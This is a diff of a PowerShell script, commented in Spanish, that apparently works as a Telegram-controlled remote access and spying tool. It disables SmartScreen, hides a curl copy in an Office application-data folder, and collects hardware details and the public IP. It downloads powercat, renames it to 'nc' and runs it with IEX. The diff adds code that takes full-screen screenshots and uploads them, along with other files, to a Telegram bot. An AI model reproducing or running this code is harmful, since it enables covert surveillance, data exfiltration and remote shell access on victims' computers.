@@ -5,7 +5,7 @@ function Disable-Smartscreen {param ($File,$Output) $archivo = get-item $file ; 
 
 function bot-send {
 
-param ($photo,$file,$botkey,$chat_id,$screenshot)
+param ($photo,$file,$botkey,$chat_id)
 
 $ruta = $env:USERPROFILE + "\appdata\local\Microsoft\Office"
 $curl = $ruta + "\" + "curl.exe"
@@ -20,12 +20,19 @@ Remove-Item $curl
 
 if ($file -ne $null) {
 $proceso = $curl_mod
-Write-Host $proceso
 $uri = "https://api.telegram.org/bot" + $botkey + "/sendDocument"
 $argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $file  + ' -k '
-Write-Host $argumenlist
-
 Start-Process $proceso -ArgumentList $argumenlist }
+
+if ($photo -ne $null){
+
+$proceso = $curl_mod
+$uri = "https://api.telegram.org/bot" + $botkey + "/sendPhoto"
+$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F photo=@' + $file  + ' -k '
+Start-Process $proceso -ArgumentList $argumenlist 
+
+
+}
 
 }
 
@@ -64,11 +71,43 @@ $PC = New-Object psobject -Property @{
 $PC | select-Object Nombre, "Modelo Monitor", "Monitor Num. Serie", "Sistema Operativo", "Procesador", "Fabricante", "Modelo", "Num. Procesadores", "Memoria RAM", "Disco Duro", "Direccion IP", "MAC", "Numero de Serie" 
 }
 function public-ip {$datos_ip_publica = Invoke-WebRequest -Uri http://ifconfig.co/json; $resultado = New-Object psobject -Property @{"IP"= $datos_ip_publica.ip
- "Pai­s" = $datos_ip_publica.country
- "Ciudad" = $datos_ip_publica.city} ; $resultado | Select-Object IP, Pai­s, Ciudad}
+ "Pais" = $datos_ip_publica.country
+ "Ciudad" = $datos_ip_publica.city} ; $resultado | Select-Object IP, Pais, Ciudad}
 
 function bot-public {$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates" ; $Obtenemos_datos_actualizados = (invoke-WebRequest -Uri $getUpdatesLink -Method post).content ; $Obtenemos_datos_actualizados = $Obtenemos_datos_actualizados -split "," ; $chat_id =  $Obtenemos_datos_actualizados | Select-String "chat"; $chat_id = $chat_id[0] -replace '"chat":{"id":' ; $chat_id_result = New-Object psobject -Property @{"chat_id"= $chat_id} ; $chat_id_result | Select-Object chat_id}
 
 $powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat
 
-function screen-shot {}
+function screen-shot {param ($botkey,$chat)
+
+$ruta = $env:USERPROFILE + "\appdata\local\Microsoft\Office\" + "screenshot.png"
+
+Add-Type -AssemblyName System.Windows.Forms
+$resolucion = [System.Windows.Forms.Screen]::AllScreens | Select-Object bounds
+$resolucion = $resolucion -split (",")
+$ancho = $resolucion[2] -replace "width="
+[string]$alto = $resolucion[3] -replace "height=" ; $alto =  $alto -replace ".$" ; $alto =  $alto -replace ".$"
+$ancho = [int]$ancho
+$alto = [int]$alto
+$horizontal = (Get-WmiObject -Class Win32_VideoController).CurrentHorizontalResolution
+$vertical = (Get-WmiObject -Class Win32_VideoController).CurrentVerticalResolution
+[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $ancho, $alto)
+
+function screenshot([Drawing.Rectangle]$bounds, $path) {
+   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
+   $graphics = [Drawing.Graphics]::FromImage($bmp)
+
+   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+
+   $bmp.Save($path)
+
+   $graphics.Dispose()
+   $bmp.Dispose()
+ }
+
+ screenshot $bounds $ruta
+
+bot-send -photo $ruta -botkey $botkey -chat_id $chat_id
+
+}
